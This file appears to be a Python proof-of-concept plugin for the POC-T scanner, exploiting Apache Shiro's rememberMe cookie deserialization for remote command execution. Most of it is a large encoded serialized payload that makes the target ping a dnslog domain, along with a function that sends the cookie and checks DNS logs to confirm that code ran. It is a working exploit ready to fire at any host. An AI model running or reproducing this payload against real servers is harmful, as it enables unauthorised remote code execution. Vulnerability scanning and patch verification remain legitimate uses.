#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
Apache Shiro 反序列化 远程命令执行

command = 'ping shiro.xxx.dnslog.info'

python POC-T.py -T -m shiro-deserial-rce -s 127.0.0.1:8080

"""

import requests
from plugin.cloudeye import queryDnsRecord

cookies = {
    'rememberMe': r"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"
}


def poc(url):
    target = 'http://' + url if '://' not in url else url
    try:
        requests.get(target, cookies=cookies, timeout=10)
        q = queryDnsRecord('shiro.xxx.dnslog.info')
        if url.split('://')[-1].split(':')[0] in q:
            return url
    except Exception, e:
        pass
    return False
